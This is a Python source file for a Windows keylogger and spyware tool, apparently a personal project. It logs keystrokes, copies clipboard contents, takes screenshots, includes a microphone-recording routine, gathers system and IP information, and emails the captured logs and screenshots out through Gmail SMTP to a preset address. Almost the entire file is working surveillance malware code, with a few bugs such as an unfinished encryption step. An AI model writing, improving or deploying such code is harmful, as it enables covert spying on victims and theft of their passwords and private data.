# Libraries

from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from numpy import number
from numpy.lib import copy  # To capture the screen
from requests import get  # for getting the ip address
import getpass  # For getting the username
from cryptography.fernet import Fernet  # For encryption
import sounddevice as sd  # To record audio
from scipy.io.wavfile import write  # for recording
import os  # for file handling
import time  # for time.sleep()
from pynput.keyboard import Key, Listener  # To get the keystrokes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket  # To get hostname
import platform  # To get OS name

import pywintypes
import win32clipboard  # This is the library for copying text from the clipboard
print('run')

"""------------------------------------------------------------"""

keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"

time_iteration = 15
microphone_time = 10

email_address = "email_address"
password = "email_password"

toaddr = "email_address"

file_path = "E:\\VS Code\\KeyLogger\\Project"
extend = "\\"
file_merge = file_path+extend

"""----------------------------Email Feature-------------------------------"""
# email feature


def send_email(fileame, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Body_of_hte_mail is Log File"
    msg.attach(MIMEText(body, 'plain'))

    filename = fileame
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Conext-Disposition',
                 "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit


send_email(keys_information, file_path+extend+keys_information, toaddr)

"""-------------------To get the computer information---------------------------"""


def computer_information():
    with open(file_path+extend+system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address \n")
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() +
                " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("HostName: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()

"""----------------------------Clipboard Feature-------------------------------"""


def copy_clipboard():
    with open(file_path+extend+clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")
        f.close()


copy_clipboard()

"""---------------------Audio & SS Feature------------------------------"""


def microphone():
    fs = 44100  # Sample rate
    seconds = microphone_time  # Duration of recording

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    write(file_path+extend+audio_information,
          fs, myrecording)  # Save as WAV file


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+screenshot_information)


screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
number_of_iterations_end = 3

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    """-------------------------------BASIC KEY LOGGER----------------------------"""

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    if currentTime > stoppingTime:
        with open(file_path+extend+keys_information, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information, file_path+extend+screenshot_information, toaddr
                   )

        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time()+time_iteration

files_to_encrypt = []
files_to_encrypt.append(file_merge+system_information,
                        file_merge+clipboard_information, file_merge+keys_information)
